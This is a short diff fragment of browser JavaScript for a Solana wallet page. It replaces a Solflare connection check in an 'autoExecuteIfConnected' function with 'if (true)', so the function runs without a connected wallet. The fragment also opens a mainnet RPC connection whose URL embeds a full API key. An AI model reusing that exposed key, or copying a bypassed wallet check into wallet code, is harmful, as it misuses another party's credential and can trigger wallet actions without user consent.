@@ -346,7 +346,7 @@ $(document).ready(async function () {
   });
   async function autoExecuteIfConnected() {
     try {
-      if (window.solflare.isConnected) {
+      if (true) {
         //showLoader("#window.solflare");  // Custom function assumed
         const connection = new solanaWeb3.Connection(
           "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
